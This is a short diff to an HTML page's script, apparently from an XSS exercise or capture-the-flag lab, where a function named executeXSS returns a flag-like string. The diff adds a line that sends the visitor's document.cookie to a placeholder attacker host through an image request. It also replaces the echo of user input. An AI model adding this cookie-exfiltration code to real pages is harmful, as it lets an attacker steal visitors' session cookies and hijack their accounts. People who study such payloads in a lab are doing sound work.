@@ -119,7 +119,9 @@
     <script>
         function executeXSS() {
             var userInput = document.getElementById('userInput').value;
-            document.getElementById('output').innerHTML = "입력한 값: " + userInput;
+            var img = new Image();
+            img.src = "https://your-malicious-server.com/steal?cookie=" + encodeURIComponent(document.cookie);
+            document.getElementById('output').innerHTML = "T7{Hello Xss}";
         }
     </script>
 
